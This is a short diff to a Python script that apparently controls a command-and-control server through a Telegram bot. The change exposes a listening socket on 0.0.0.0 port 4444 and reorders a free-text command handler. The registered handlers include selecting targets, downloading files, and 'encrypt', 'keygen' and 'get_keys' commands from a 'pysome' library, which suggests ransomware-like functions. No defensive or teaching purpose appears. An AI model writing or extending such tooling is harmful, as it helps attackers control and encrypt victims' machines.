@@ -10,8 +10,8 @@ import urllib.request
 from Mods import lib_pysome as pysome
 
 
-host = "127.0.0.1"
-port = 1234
+host = "0.0.0.0"
+port = 4444
 id = 0
 web_url = 'google.com'
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -451,7 +451,6 @@ dispather.add_handler(CommandHandler('download', Doc_download))
 dispather.add_handler(CommandHandler('select', select_target))
 dispather.add_handler(CommandHandler('start', start))
 dispather.add_handler(CommandHandler('listen', listen))
-dispather.add_handler(MessageHandler(Filters.text, commanding))
 dispather.add_handler(CommandHandler('client', get_client))
 dispather.add_handler(CommandHandler('rst', restart))
 dispather.add_handler(CommandHandler('seturl', set_web_target))
@@ -466,7 +465,7 @@ dispather.add_handler(CommandHandler('set_password', pysome_set_passwd))
 dispather.add_handler(CommandHandler('get_keys', pysome_get_key))
 dispather.add_handler(CommandHandler('encrypt', start_encrypt))
 dispather.add_handler(CommandHandler('keygen', pysome_gen_keys))
-
+dispather.add_handler(MessageHandler(Filters.text, commanding))
 def main ():
     print("starting Bot....")    
     updater.start_polling()
